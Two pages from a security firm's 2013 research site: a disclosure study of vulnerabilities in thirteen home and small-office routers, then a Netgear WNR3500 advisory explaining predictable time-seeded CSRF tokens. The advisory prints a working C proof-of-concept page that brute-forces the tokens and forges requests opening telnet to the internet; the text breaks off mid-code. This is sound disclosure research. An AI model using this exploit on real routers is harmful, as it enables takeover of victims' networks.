=== Content from www.ise.io_e4719efc_20250125_193037.html ===


[![...](../../assets/img/brand.svg)](../../)

* [About](../../about/values/)
  ###### About ISE

  [Company Values](../../about/values/ "Integrity, Quality, Dedication, Education")
  [Methodology](../../about/methodology/ "Learn how we deliver reports")
  [Leadership](../../about/leadership/ "Independent Security Evaluators")
  [News](../../news/ "Stay up to date")
  [Careers](../../careers/ "Join our team")
* [Services](../../services/vulnerability-assessments/)
  ###### Assessments

  [Vulnerability Assessments](../../services/vulnerability-assessments/)
  [Application Security Assessments](../../services/application-security-assessment/)
  [Cloud Security Assessments](../../services/cloud-security-assessment/)
  [Penetration Testing](../../services/penetration-testing/)
  [Network Penetration Testing](../../services/network-penetration-testing/)
  [Vulnerability Scanning](../../services/managed-vulnerability-scanning/)
  ###### Hacking Events

  [IoT Village](https://www.iotvillage.org/)

  ###### Consulting

  [Security Consulting](../../services/security-consulting-services/)
  [Independent Verification & Validation](../../services/independent-verification-and-validation/)
  [Secure Design Analysis](../../services/secure-design-analysis/)
  [IT Consulting](../../services/it-consulting-services/)
  ###### Training

  [Security Training](../../services/training/)
  [Hackalong](https://offers.ise.io/ise-application-security-training-workshop)
* [Research](../../research/)
  ###### Research

  [Papers & Studies](../../research/ "Papers & Studies")
  [Talks](../../talks/ "Talks")
  [Hackers Blog](../../blog/ "Hackers Blog")
  [Industry Blog](https://blog.ise.io/blog "Industry Blog")
  [VRM/TPRM Articles](../../start/blog/ "Join our team")
  [Podcast](../../research/podcast/ "Join our team")

* [START - Vendor Risk Management](../../start/)

[Ask an Expert](https://offers.ise.io/ask-an-expert)

# Exploiting SOHO Routers

August 12, 2013

ISE researchers discovered critical security vulnerabilities in numerous small
office/home office (SOHO) routers and wireless access points. These vulnerabilities
allow a remote attacker to take full control of the router's configuration settings;
some allow a local attacker to bypass authentication directly and take control. This
control allows an attacker to intercept and modify network traffic as it enters and
leaves the network.

**UPDATE:** We have posted an [**additional study**](../../research/soho_service_hacks/) of
security vulnerabilities in extraneous, non-router services running on SOHO routers.

**UPDATE:** Learn more about this on CNET's
[article on our router hacks](http://news.cnet.com/8301-1009_3-57579981-83/top-wi-fi-routers-easy-to-hack-says-study/) and
its [accompanying video](http://news.cnet.com/1606-2_3-50145624.html).

**INQUIRIES:** For more information on this
routers project, you can contact us at . For general inquiries, [click here to contact ISE](../../contact/).

## Introduction

ISE researchers have discovered critical security vulnerabilities in numerous small
office/home office (SOHO) routers and wireless access points. We define a critical
security vulnerability in a router as one that allows a remote attacker to take full
control of the router's configuration settings, or one that allows a local attacker
to bypass authentication and take control. This control allows an attacker to
intercept and modify network traffic as it enters and leaves the network.

* All 13 routers evaluated can be taken over from the local network
  + 4 of these attacks require no active management session.
* 11 of 13 routers evaluated can be taken over from the WAN
  + 2 of these attacks require no active management session.

Â

### Motivation

Despite being widely distributed and deployed in nearly every modern home and small
office, SOHO networking equipment has received surprisingly little attention from
security researchers. Yet, these devices facilitate the connectivity and protection
(we hope) of millions of end-systems. The critical
vulnerabilities that persist in these widely used devices demonstrate an urgent need
for deeper scrutiny.

ISE initially set out to evaluate the security of ten popular, off-the-shelf SOHO
wireless routers. The final scope of the research project was expanded to include
thirteen unique devices. Our research indicates that a moderately skilled adversary
with LAN or WLAN access can exploit all thirteen routers. We also found that nearly
all devices had critical security vulnerabilities that could be exploited by a
remote adversary, resulting in router compromise and unauthorized remote control. At
least half of the routers that provided network attached storage (NAS) were found to
be accessible by a remote adversary (full details will be disclosed in a future
article).

We further categorize these remotely and locally accessible vulnerabilities by
indicating their associated attack requirements:

* Trivial attacks can be launched directly against the router with no human
  interaction or access to credentials.
* Unauthenticated attacks require some form of human interaction, such as
  following a malicious link or browsing to an unsafe page, but do not require an
  active session or access to credentials.
* Authenticated attacks require that the attacker have access to credentials (or
  that default router credentials are usedâan all-too-common situation) or that a
  victim is logged in with an active session at the time of the attack.

Â

We considered client-side attacks to be in scope, so long as they consist entirely of
HTML and JavaScript code running in a web browser.

## Summary

| Â | Remote Adversary | | | Local Adversary | | |
| --- | --- | --- | --- | --- | --- | --- |
| Router | Trivial | Unauthenticated | Authenticated | Trivial | Unauthenticated | Authenticated |
| [Linksys WRT310Nv2](../../research/studies-and-papers/linksys_wrt310v2/) | Â | Â | X | Â | Â | X |
| [Belkin F5D8236-4 v2](../../research/studies-and-papers/belkin_f5d8236-4v2/) | Â | Â | X | Â | Â | X |
| [Belkin N300](../../research/studies-and-papers/belkin_n900/) | Â | X | X | X | X | X |
| [Belkin N900](../../research/studies-and-papers/belkin_n900/) | Â | X | X | X | X | X |
| [Netgear WNDR4700](../../research/studies-and-papers/netgear_wndr4700/) | Â | Â | Â | X | X | X |
| [TP-Link WR1043N](../../research/studies-and-papers/tp-link_wr1043n/) | Â | Â | X | Â | Â | X |
| [Verizon Actiontec](../../research/studies-and-papers/actiontec/) | Â | Â | X | Â | Â | X |
| [D-Link DIR-865L](../../research/studies-and-papers/dlink_dir865l/) | Â | Â | X | Â | Â | X |
| [ASUS RT-N56U](../../research/studies-and-papers/asus_rtn56u/) | Â | Â | X | Â | Â | X |
| [ASUS RT-AC66U](../../research/studies-and-papers/asus_rtn56u/) | Â | Â | X | Â | Â | X |
| [Linksys EA6500](../../research/studies-and-papers/linksys_ea6500/) | Â | Â | Â | Â | Â | X |
| [Netgear WNR3500](../../research/studies-and-papers/netgear_wnr3500/) | Â | Â | X | X | X | X |
| [TRENDnet TEW-812DRU](../../research/studies-and-papers/trendnet_tew-812dru/) | Â | Â | X | Â | Â | X |

## Important notes

* Disclaimer. ISE did not exhaustively evaluate these routers, and in no way
  asserts that other product vulnerabilities do not exist. Many of these routers
  enable by defaultâor provide the capability to enableâtelnet, ftp, and other
  services that have not been fully investigated. Our research was directed at
  assessing the ubiquity of these vulnerabilities, and not the number of issues
  present in any specific router model, or through any particular service or form
  of attack.
* Remote services. None of the routers evaluated enabled remote administration by
  default, or any remote services . However, this option is available to
  administrators, and if enabled, drastically increases the router's
  exploitability in each case. ISE recommends administrators not enable remote
  administration, or remote services under any circumstances.
* Remote compromise definition. We define remote compromise as full control of a
  router at the operating-system level by an adversary inside or outside of the
  router's domain.
* Fully updated. Prior to our evaluation, all routers were updated to the latest
  firmware, and tested with out-of-the-box configuration settings.

## Impact; new threats

SOHO router vulnerabilities impact consumers in a number of ways that differ from the
vulnerabilities that typically afflict end-systems, and through those
vulnerabilities new threats arise. The number of parties affected by an individual
or widespread router compromise is expanded, there could be lasting damage to users
or soho networking device vendors, and detecting or recovering from an exploit of
this type can be difficult.

### Affected parties: who is the victim?

A typical end-system compromise pegs the end-user as the victim. Certainly, advanced
threats leverage end-system compromise to gain a network foothold and attempt to
compromise lateral systems, but in general there is one victim, and one party
responsible for cleaning up the mess.

A SOHO router compromise not only affects that device, but the many end-systems it
supports, the infrastructure of which it is a part, the community of sites visited
by the end-users, and even the soho networking device vendor.

### Implications

The impact of these routers' security flaws is exacerbated by the fact that
unauthenticated attacks can target not only the administrator of a victim router's
(W)LAN, but any user on the (W)LAN. A parent or child in the case of the home, any
or all students behind a university router, or any guest or untrained user of a
small office or enterprise network can be targeted and leveraged to gain full
control of the SOHO networking device, which may also lead to additional attacks
being launched against other users.

### Significance of compromise

Once compromised, any routerâSOHO or otherwiseâmay be used by an adversary to secure
a man-in-the-middle position for launching more sophisticated attacks against all
users in the router's domain. This includes sniffing and rerouting all non-SSL
protected traffic, poisoning DNS resolvers, performing denial of service attacks, or
impersonating servers. Worse still, is that these routers are also firewalls, and
often represent the first (and last) line of defense for protecting the local
network. Once compromised, the adversary has unfettered access to exploit the
vulnerabilities of local area hosts that would be otherwise unreachable if the
router were enforcing firewall rules as intended.

### Difficult Recovery; Persistent issue

The overall community impact could be much worse. Considering that many soho
networking device administrators are not computer or security savvy, default
settings are undoubtedly prevalent. Even in the case where the vulnerabilities
identified here and elsewhere are addressed by the vendor, it may not be reasonable
to expect that SOHO networking device owners know about these issues, or will
upgrade/patch their routers' firmware, which is the predominant distribution
mechanism for SOHO networking device updates. In such cases, the vulnerabilities may
remain unresolved indefinitely.

"Bricking" of SOHO networking devices could also become an issue due to the
cumbersome and unauthenticated nature of the firmware upgrade process. As we've
identified, in all routers evaluated a remote adversary can replace a vendor's
firmware with their own. If such firmware were (intentionally) faulty, it could
render a device unusable. The damage to users and vendors could be significant
depending upon the number of devices in the field, the rate at which they can be
compromised or "bricked," and the cost to replace or repair them.

### Large-scale threats

So far we have acknowledged that users belonging to an affected router's domains are
at risk, but if any ISP deploys a router at scale with these types of
vulnerabilitiesâor has many customers using routers with these types of
vulnerabilitiesâan adversary may leverage the vulnerabilities to directly attack the
provider, core infrastructure, or other organizational targets, e.g., corporations
and nation-states. This also presents a large surface for new botnet deployment or
command and control (C2) strategies to facilitate DDoS attacks and cybercrime
activities.

## Mitigations

Unfortunately, there is little the average end-user can do to fully mitigate these
attacks. Successful mitigation often requires a level of sophistication and skill
beyond that of the average user (and beyond that of the most likely victims).

### Recommendations for Vendors

SOHO networking device VENDORS should take the following actions to help mitigate
these issues.

* Prepare and make available firmware upgrades that address these issues.
* Notify registered users of these vulnerabilities, and distribute instructions on
  how to upgrade device firmware.
* Regularly audit devices for security vulnerabilities, produce and distribute
  security patches in a timely manner, and notify registered customers.

Â

SOHO networking device VENDORS should incorporate the following design changes in to
their product lines.

* Using authenticated (digitally signed, and verifiable by the router) firmware
  updates.
* Designing a method for automatic firmware updates, that can be opted out of by
  users.
* Perform regular security audits to ensure devices are as hardened as possible.

### Recommendations for Device Administrators

SOHO networking device ADMINISTRATORS should take the following actions to help
mitigate these issues.

* Upgrade your firmware regularly.
* Disable (or do not enable) remote administration.
* Disable (or do not enable) network services that are not utilized within the
  LAN, e.g., FTP, SMB, UPnP.
* Log out from, and restart, your SOHO networking device after logging in for
  administrative tasks.
* Clear browser cookies and active logins after logging out from your router.
* Choose a non-standard (W)LAN IP address range (subnet), which will make generic
  automated attacks less effective against your network.
* If possible, enable HTTPS for all administrative connections. For all of the
  routers we evaluated that had this feature, it was disabled by default.
* Make sure your WLAN is protected using WPA2 encryption and is not left as an
  open WiFi network or protected with the outdated WPA or WEP standards.
* ONLY install firmware from the router manufacturers website.
* Choose a secure router administration password consisting of upper/lowercase
  alphanumeric and special characters that is at least 12 characters in length.
* If your SOHO device is behind an additional firewall, restrict inbound access to
  this device from the greater WAN.

### Recommendations for End Users

END-USERS behind SOHO networking devices should take the following actions to help
mitigate these issues.

* Do not discount browser or other software warnings of potential MITM attacks.
* Do not follow links sent through email or by other means, especially ones that
  are directed to what could potentially be a SOHO networking device (e.g.,
  192.168.2.1).
* Be diligent, and browse safely.

Â

## Disclosures

For all vulnerabilities identified in this research, ISE has disclosed the issues to
the product vendors through their typical vulnerability reporting mechanism, as well
as any other channels for which we had access. We've given what we believe is
adequate time to address the issues disclosed, and to the extent it has been
reasonable, we've helped those vendors develop or implement mitigations. We welcome
all vendor feedback, and are happy to assist with any additional information that
may facilitate a quick resolution to any of these vulnerabilities.

Beyond the vulnerabilities listed in this case study, our research has brought to
light 17 issues that have received Common Vulnerabilities and Exposure (CVE)
numbers, and 21 CVE submissions pending.

* CVE-2013-0126: Cross-Site Request Forgery
* CVE-2013-2644: FTP Directory Traversal
* CVE-2013-2645: Cross-Site Request Forgery
* CVE-2013-2646: Denial of Service
* CVE-2013-3064: Unvalidated URL Redirect
* CVE-2013-3065: DOM Cross-Site Scripting
* CVE-2013-3066: Information Disclosure
* CVE-2013-3067: Cross-Site Scripting
* CVE-2013-3068: Cross-Site Request Forgery
* CVE-2013-3069: Cross-Site Scripting
* CVE-2013-3070: Information Disclosure
* CVE-2013-3071: Authentication Bypass
* CVE-2013-3072: Unauthenticated Hardware Linking
* CVE-2013-3073: SMB Symlink Traversal
* CVE-2013-3074: Media Server Denial of Service
* CVE-2013-3083: Cross-Site Request Forgery
* CVE-2013-3084: Cross-Site Scripting
* CVE-2013-3085: Authentication Bypass
* CVE-2013-3086: Cross-Site Request Forgery
* CVE-2013-3087: Cross-Site Scripting
* CVE-2013-3088: Authentication Bypass
* CVE-2013-3089: Cross-Site Request Forgery
* CVE-2013-3090: Cross-Site Scripting
* CVE-2013-3091: Authentication Bypass
* CVE-2013-3092: Failure to Validate HTTP Authorization Header
* CVE-2013-3095: Cross-Site Request Forgery
* CVE-2013-3096: Unauthenticated Hardware Linking
* CVE-2013-3097: Cross-Site Scripting

## Related Work

As stated earlier in this article, there has been little research published in the
area of SOHO router security, however some interesting results have been disclosed
by security researchers in recent years.

In March, 2013, Michael Messner [disclosed vulnerabilities](https://community.rapid7.com/community/metasploit/blog/2013/03/28/weekly-update) ranging
from minor to critical in D-Link, TP-Link, Netgear, and Linksys routers. The
vulnerabilities disclosed included authenticated and unauthenticated arbitrary
command injection, information disclosure, unencrypted password storage, directory
traversal, and persistent cross-site scripting.

In January, 2013, HD Moore disclosed that [numerous home routers exposed UPnP services](https://community.rapid7.com/docs/DOC-2150),
including SSDP Discovery and SOAP, to the Internet (WAN) side of the device. This
could lead to remote attackers modifying firewall rules or accessing private media
files using DLNA. Worse, many of the UPnP implementations had numerous buffer
overflow vulnerabilities.

Also in January, 2013, DefenseCode released [an advisory](http://www.defensecode.com/public/DefenseCode_Broadcom_Security_Advisory.pdf) describing a remote,
unauthenticated format string vulnerability in the Broadcom UPnP software that
escalated to root shell access.

At BlackHat 2012, Phil Purviance (Superevr) [demonstrated](https://superevr.com/blog/) a cross-site file
upload vulnerability in the Linksys WRT54GL. In early 2013, Purviance researched the
Linksys EA2700 and found numerous vulnerabilities, including cross-site scripting,
directory and file traversal, unauthenticated password changes, and source code
disclosure vulnerabilities.

In May, 2012, [it was disclosed](http://www.kb.cert.org/vuls/id/723755) that WiFi Protected Setup (WPS)
uses an eight-digit PIN for authentication, and an attacker can determine if the
first four digits of an attempted PIN are correct, without regard to the last four.
Worse, as this CERT vulnerability disclosed, many home routers fail to implement any
rate limiting after successive incorrect PIN attempts.

At [BlackHat 2009](http://www.blackhat.com/presentations/bh-usa-09/LINDNER/BHUSA09-Lindner-RouterExploit-SLIDES.pdf), Felix Lindner
explored the feasibility and techniques that could be used to attack commercial
grade routers. He found very few public vulnerabilities in this class of equipment.

## Future work

Six months after releasing the advisories for the 13 routers, ISE will upgrade the
firmware on all 13 routers and perform a reassessment to determine whatâif
anyâimpact deeper scrutiny from the security community has brought to the SOHO
router industry. ISE may also expand the scope of the next study to include
additional routers.

## Attribution and acknowledgments

This research was conducted by Jacob Holcomb of Independent Security Evaluators and
directed by Stephen Bono and Sam Small. Jacob Thomspon, Kedy Liu, Ali Jad Khalil,
and Vincent Faires made additional contributions.

## References

Messner, Michael. [Multiple Vulnerabilities in D-Link DIR-600 and
DIR-300](http://www.s3cur1ty.de/node/672). Revision B. February 2013.

Beardsley, Tom. [Weekly Update: Consumer-Grade Hacking,
Attribution and Testing, and Msfupdate updates.](https://community.rapid7.com/community/metasploit/blog/2013/03/28/weekly-update) Rapid7 Metasploit Blog.
March 28, 2013.

Moore, HD. [Security Flaws in Universal Plug and Play.](https://community.rapid7.com/docs/DOC-2150) Rapid7,
Inc., January 2013.

[Broadcom UPnP Remote Preauth Code
Execution Vulnerability.](http://www.defensecode.com/public/DefenseCode_Broadcom_Security_Advisory.pdf) January 31, 2013.

Allar, Jared. [WiFi Protected Setup (WPS) PIN brute force
vulnerability.](http://www.kb.cert.org/vuls/id/723755) US CERT Vulnerability #723755. May 10, 2012.

Lindner, Felix. [Router Exploitation](http://www.blackhat.com/presentations/bh-usa-09/LINDNER/BHUSA09-Lindner-RouterExploit-SLIDES.pdf). Black Hat
2009.

Purviance, Phil. [Don't Use Linksys Routers.](https://superevr.com/blog/) Superevr. April 5,
2013.

Mimoso, Michael. [Serious Vulnerabilities Found in
Popular Home Wireless Routers.](http://threatpost.com/en_us/blogs/serious-vulnerabilities-found-popular-home-wireless-routers-040813) threatpost. April 8, 2013

![...](../../assets/img/brand-text.svg)

* [![...](../../assets/img/icons/social/linkedin.svg)](https://www.linkedin.com/company/independent-security-evaluators)
* [![...](../../assets/img/icons/social/facebook.svg)](https://facebook.com/ISE.infosec)
* [![...](../../assets/img/icons/social/twitter.svg)](https://twitter.com/ISEsecurity)

###### [Contact Us](../../contact/)

###### [Privacy Policy](../../privacy-policy/)

###### About

* [Company Values](../../about/values/)
* [Methodology](../../about/methodology/)
* [Leadership](../../about/leadership/)
* [News](../../news/)
* [Careers](../../careers/)

###### Services

* [Assessments](../../services/vulnerability-assessments/)
* [Consulting](../../services/security-consulting-services/)
* [IoT Village](https://www.iotvillage.org/)
[Training](../../services/training/)

###### Research

* [Studies & Papers](../../research/)
* [Talks](../../talks/)
* [Blog](../../blog/)
* [VRM/TPRM Articles](../../start/blog/)

###### Stay up to date on the latest research and industry trends. Sign up for our newsletter



=== Content from www.ise.io_6cdb0c97_20250125_193037.html ===


[![...](../../../assets/img/brand.svg)](../../../)

* [About](../../../about/values/)
  ###### About ISE

  [Company Values](../../../about/values/ "Integrity, Quality, Dedication, Education")
  [Methodology](../../../about/methodology/ "Learn how we deliver reports")
  [Leadership](../../../about/leadership/ "Independent Security Evaluators")
  [News](../../../news/ "Stay up to date")
  [Careers](../../../careers/ "Join our team")
* [Services](../../../services/vulnerability-assessments/)
  ###### Assessments

  [Vulnerability Assessments](../../../services/vulnerability-assessments/)
  [Application Security Assessments](../../../services/application-security-assessment/)
  [Cloud Security Assessments](../../../services/cloud-security-assessment/)
  [Penetration Testing](../../../services/penetration-testing/)
  [Network Penetration Testing](../../../services/network-penetration-testing/)
  [Vulnerability Scanning](../../../services/managed-vulnerability-scanning/)
  ###### Hacking Events

  [IoT Village](https://www.iotvillage.org/)

  ###### Consulting

  [Security Consulting](../../../services/security-consulting-services/)
  [Independent Verification & Validation](../../../services/independent-verification-and-validation/)
  [Secure Design Analysis](../../../services/secure-design-analysis/)
  [IT Consulting](../../../services/it-consulting-services/)
  ###### Training

  [Security Training](../../../services/training/)
  [Hackalong](https://offers.ise.io/ise-application-security-training-workshop)
* [Research](../../../research/)
  ###### Research

  [Papers & Studies](../../../research/ "Papers & Studies")
  [Talks](../../../talks/ "Talks")
  [Hackers Blog](../../../blog/ "Hackers Blog")
  [Industry Blog](https://blog.ise.io/blog "Industry Blog")
  [VRM/TPRM Articles](../../../start/blog/ "Join our team")
  [Podcast](../../../research/podcast/ "Join our team")

* [START - Vendor Risk Management](../../../start/)

[Ask an Expert](https://offers.ise.io/ask-an-expert)

# Taking over the Netgear WNR3500

[[return to summary]](../../../casestudies/exploiting-soho-routers/#summary)

* The WNR3500 can be trivially taken over by any adversary on the LAN or WLAN.
* The WNR3500 can be taken over by a remote adversary through CSRF attack.

## Description

The Netgear WNR3500 router is susceptible to a previously disclosed vulnerability in its Telnet service that runs by default on port 23.

ISE discovered that a remote adversary can leverage a CSRF against a WNR3500 administrator to gain control of the router. The WNR3500 uses HTML form tokens to protect against CSRF attacks. However, the form tokens are based solely on router's current date and time. Since the router automatically synchronizes its date and time with Netgear NTP servers, it is trivial for an adversary to guess the CSRF tokens generated on these routers. ISE created a proof of concept that when executed by an unsuspecting device administrator, attempts to use every HTML form token that could have been created in the previous 20 minutes to enable remote management and remote Telnet access to the router.

## Local Attack Requirements

* An attacker must have access to a machine on the local network, either by physically connecting, or by compromising a machine on the local network through other means (e.g., via malware).

## Remote Attack Requirements

* The victim must have an active management session with the WNR3500.
* The victim must be fooled in to performing an action (e.g., by clicking an attacker provided link), browse to a malicious or compromised site, or be the victim of a man-in-the-middle attack.
* The router must have, or have had NTP access to its predefined servers (though, even without this, guessing is still possible).

## Details

The Netgear WNR3500's anti-CSRF token generation is based on the C library calls `srand(time(NULL))` and `rand()`. The WNR3500 automatically synchronizes its time using NTP after it establishes an Internet connection. By synchronizing with Netgear's NTP servers, an attacker can obtain the same date and time as on the router.

ISE's proof of concept attempts to use the 1200 possible anti-CSRF tokens that would have been generated in the last 20 minutes to enable remote management and -- because the router's password may differ from the default -- open the router's Telnet interface to the Internet.

The telnet interface has no authentication other than using a "telnetenable" program that is widely available on the Internet. An attacker must brute-force the device's MAC address to craft the correct "telnetenable" packet, but only three of six bytes of the address are unknown.

* Vulnerable Firmware is V1.2.2.44\_35.0.53NA
* Other versions of the firmware were not tested.

## Impact

A successful attack exploiting this vulnerability can give a remote adversary full control over the victim router.

## Recommendations to the vendor

* The implementation of anti-CSRF tokens in the WNR3500 is insecure, because an attacker can reasonably guess and reproduce the token generation process. Cross-Site request forgery can be prevented by including an unpredictable token in each HTTP request submitted to the web server. At a minimum, these tokens should be unique to each user, but it is recommended that each HTML form delivered contain a unique token.
* In addition to HTML form tokens, HTTP referer checking should be enabled.
* Additional information for vendors regarding immediate and long term fixes for these issues can be found on our summary page [here](../../../casestudies/exploiting-soho-routers/#recommendationsVendors).

## Recommendations to device administrators

* (4/13/2013) There is not currently an available firmware upgrade that will remedy this vulnerability.
* Take additional preventative measures and precautions by following the steps outlined on our summary page [here](../../../casestudies/exploiting-soho-routers/#recommendationsAdmin).

## Proof of Concept

This attack was complicated by the fact that CSRF tokens are used, an administrator password is required to change or reset the administrator credentials, and that the router rejects the addition of port forwarding rules to itself. All of these hurdles were overcome in our proof of concept attack.

Beating CSRF tokens. The WNR3500 uses anti-forgery tokens that are based on the current time. This was discovered by debugging the router-side code that generates these tokens. Since they are based on the current time, they can be easily guessed by attempting all tokens that could have been generated in the previous 20 minutes.

Bypassing the credential requirements. Enabling and accessing the WNR3500's web interface is useless without administrator crendentials, and these can not be obtained or reset through the same CSRF attack. However, as there is a local authentication bypass vulnerability described here, we were able to leverage this issue to gain access instead. Our CSRF attack just had to enable some port forwarding rules to grant us remote access to the Telnet administration interface.

For launching our proof of concept, we assume that a Netgear WNR3500 device administrator with an active management session established with the router has browsed to a malicious web page. Once there, sequential form submissions take place, automatically, to the administrator's router, from the administrator's browser. Since the administrator has a current session established with the Netgear router, the form submissions are processed.

The malicious CGI program (Figure 1) provides an initial attack page, and three additional pages for each of the needed requests (enable remote management, enable Telnet port forwarding, and change the router's IP address to match the destination of the port forwarding).

The initial attack page contains 1200 anti-CSRF tokens (i.e., those that could have been generated in the past 20 minutes) and JavaScript code to make the three forged requests for each one of them. The first request enables remote management on the router, the second forwards WAN port 23 requests to temporary IP address 192.168.1.254 on port 23, and the third request changes the router's LAN IP address to 192.168.1.254.

Once the router resets, the Telnet service is open to the Internet, and an attacker could use the Netgear "telnetenable" tool to access Telnet. This tool requires knowledge of the router's MAC address, which contains six bytes, three of which are unique. It is unlikely that these three bytes are randomly chosen (making for a reasonably easy guessing scenario), but even if they were, an attacker could brute force guess the three bytes in 46 hours at 100 telnetenable requests per second.

After obtaining root shell access through Telnet, an attacker has full control of the router.

| ```  /*  * Netgear WNR3500 CSRF  * Firmware: V1.2.2.44_35.0.53NA  * Discovered and Exploited By:   *  Jacob Thompson of Independent Security Evaluators  * /  */ #include <stdio.h> #include <stdlib.h> #include <time.h>  /*  * CGI script to implement CSRF attack.  */ int main (void) {    const char *qs = getenv ("QUERY_STRING");     /* initial request */    if (!qs || !*qs)    {       unsigned int seed = time (NULL);       unsigned int i;        puts ( 	 "Content-Type: text/html; charset=iso-8859-1\n\n" 	 "<!DOCTYPE html PUBLIC \"-//W3C//DTD HTML 4.01//EN\">\n" 	 "<html>\n" 	 "<head>\n" 	 "<title>Netgear CSRF</title>\n" 	 "</head>\n" 	 "<body>\n" 	 "<iframe id=\"ifr1\" src=\"\"></iframe>\n" 	 "<iframe id=\"ifr2\" src=\"\"></iframe>\n" 	 "<iframe id=\"ifr3\" src=\"\"></iframe>\n" 	 "<form name=\"form\">\n" 	 " ID: <input type=\"text\" name=\"_id\" value=\"\">\n" 	 " # <input type=\"text\" name=\"_i\" value=\"\"> of 1200\n" 	 "</form>" 	 "<script type=\"application/javascript\">\n" 	 " var i = 0;\n" 	 " var ifr1 = document.getElementById(\"ifr1\");\n" 	 " var ifr2 = document.getElementById(\"ifr2\");\n" 	 " var ifr3 = document.getElementById(\"ifr3\");\n" 	 " var ids = [");        /* generate 1200 (20 minutes) worth of tokens */       for (i = 0; i < 1200; ++i)       { 	 srand (seed - i); 	 printf ("  %d,\n", rand ());       }       puts ( 	 " ];\n" 	 " function nextId ()\n" 	 " {\n" 	 "  if (i < 1200)\n" 	 "  {\n" 	 "   document.form._id.value = ids[i];\n" 	 "   document.form._i.value = i;\n" 	 "   ifr1.src = \"netgear?A\" + ids[i];\n" 	 "   ifr2.src = \"netgear?B\" + ids[i];\n" 	 "   ifr3.src = \"netgear?C\" + ids[i];\n" 	 "   ++i;\n" 	 "  }\n" 	 " }\n" 	 " window.setInterval (nextId, 200)\n" 	 "</script>\n" 	 "</body>\n" 	 "</html>");    }    /* first request - enable remote management */    else if (*qs == 'A')    {       unsigned int id = atoi (qs + 1);       printf ( 	 "Content-Type: text/html; charset=iso-8859-1\n\n" 	 "<!DOCTYPE html PUBLIC \"-//W3C//DTD HTML 4.01//EN\">\n" 	 "<html>\n" 	 "<head>\n" 	 "<title></title>\n" 	 "</head>\n" 	 "<body>\n" 	 "<form name=\"csrf\" method=\"post\"" 	 " action=\"http://192.168.1.1/fwRemote.cgi?id=%d\">\n" 	 " <input type=\"hidden\" name=\"rm_access\" value=\"all\">\n" 	 " <input type=\"hidden\" name=\"remote_mg_enable\"" 	 " value=\"remote_mg\">\n" 	 " <input type=\"hidden\" name=\"http_wanipaddr\"" 	 " value=\"0.0.0.0\">\n" 	 " <input type=\"hidden\" name=\"http_rmstartip\"" 	 " value=\"0.0.0.0\">\n" 	 " <input type=\"hidden\" name=\"http_rmport\"" 	 " value=\"8080\">\n" 	 " <input type=\"hidden\" name=\"http_rmendip\"" 	 " value=\"255.255.255.255\">\n" 	 " <input type=\"hidden\" name=\"http_rmenable\" value=\"1\">\n" 	 " <input type=\"hidden\" name=\"Apply\" value=\"apply\">\n" 	 "</form>\n" 	 "<script type=\"application/javascript\">\n" 	 " document.csrf.submit ();\n" 	 "</script>\n" 	 "</body>\n" 	 "</html>\n", id);    }    /* second request - forward telnet to 192.168.1.254 */    else if (*qs == 'B')    {       unsigned int id = atoi (qs + 1);       printf ( 	 "Content-Type: text/html; charset=iso-8859-1\n\n" 	 "<!DOCTYPE html PUBLIC \"-//W3C//DTD HTML 4.01//EN\">\n" 	 "<html>\n" 	 "<head>\n" 	 "<title></title>\n" 	 "</head>\n" 	 "<body>\n" 	 "<form name=\"csrf\" method=\"post\"" 	 " action=\"http://192.168.1.1/pforward.cgi?id=%d\">\n" 	 " <input type=\"hidden\" name=\"svs_gm\" value=\"Telnet\">\n" 	 " <input type=\"hidden\" name=\"svAdd\" value=\"Add\">\n" 	 " <input type=\"hidden\" name=\"SV_IP4\" value=\"254\">\n" 	 " <input type=\"hidden\" name=\"SV_IP3\" value=\"1\">\n" 	 " <input type=\"hidden\" name=\"SV_IP2\" value=\"168\">\n" 	 " <input type=\"hidden\" name=\"SV_IP1\" value=\"192\">\n" 	 " <input type=\"hidden\" name=\"serv_type\" value=\"pf\">\n" 	 " <input type=\"hidden\" name=\"selectService\" value=\"Telnet\">\n" 	 " <input type=\"hidden\" name=\"selectEntry\" value=\"\">\n" 	 " <input type=\"hidden\" name=\"lanIP\" value=\"192.168.1.1\">\n" 	 " <input type=\"hidden\" name=\"inputIP\" value=\"192.168.1.254\">\n" 	 " <input type=\"hidden\" name=\"fwpf_enable\" value=\"\">\n" 	 " <input type=\"hidden\" name=\"entryData\" value=\"#0\">\n" 	 " <input type=\"hidden\" name=\"action\" value=\"add\">\n" 	 "</form>\n" 	 "<script type=\"application/javascript\">\n" 	 " document.csrf.submit ();\n" 	 "</script>\n" 	 "</body>\n" 	 "</html>\n", id);    }    /* third request - change router IP to 192.168.1.254 */    else if (*qs == 'C')    {       unsigned int id = atoi (qs + 1);       printf ( 	 "Content-Type: text/html; charset=iso-8859-1\n\n" 	 "<!DOCTYPE html PUBLIC \"-//W3C//DTD HTML 4.01//EN\">\n" 	 "<html>\n" 	 "<head>\n" 	 "<title></title>\n" 	 "</head>\n" 	 "<body>\n" 	 "<form name=\"csrf\" method=\"post\" " 	 "action=\"http://192.168.1.1/lan.cgi?id=%d\">\n" 	 " <input type=\"hidden\" name=\"action\" value=\"Apply\">\n" 	 " <input type=\"hidden\" name=\"device_name\" value=\"WNR3500L\">\n" 	 " <input type=\"hidden\" name=\"dhcp_end\" value=\"192.168.1.254\">\n" 	 " <input type=\"hidden\" name=\"dhcp_end_old\" value=\"192.168.1.254\">\n" 	 " <input type=\"hidden\" name=\"dhcp_server\" value=\"dhcp_server\">\n" 	 " <input type=\"hidden\" name=\"dhcp_start\" value=\"192.168.1.2\">\n" 	 " <input type=\"hidden\" name=\"dhcp_start_old\" value=\"192.168.1.2\">\n" 	 " <input type=\"hidden\" name=\"l2tp_serv_ipaddr\" value=\"\">\n" 	 " <input type=\"hidden\" name=\"l2tp_wan_ipaddr\" value=\"...\">\n" 	 " <input type=\"hidden\" name=\"lan_ipaddr\" value=\"192.168.1.254\">\n" 	 " <input type=\"hidden\" name=\"lan_netmask\" value=\"255.255.255.0\">\n" 	 " <input type=\"hidden\" name=\"lan_proto\" value=\"dhcp\">\n" 	 " <input type=\"hidden\" name=\"pppoe_wan_ipaddr\" value=\"...\">\n" 	 " <input type=\"hidden\" name=\"pptp_serv_ipaddr\" value=\"...\">\n" 	 " <input type=\"hidden\" name=\"pptp_wan_ipaddr\" value=\"...\">\n" 	 " <input type=\"hidden\" name=\"repeater\" value=\"0\">\n" 	 " <input type=\"hidden\" name=\"repeater_an\" value=\"\">\n" 	 " <input type=\"hidden\" name=\"rip_direction\" value=\"1\">\n" 	 " <input type=\"hidden\" name=\"rip_enable\" value=\"0\">\n" 	 " <input 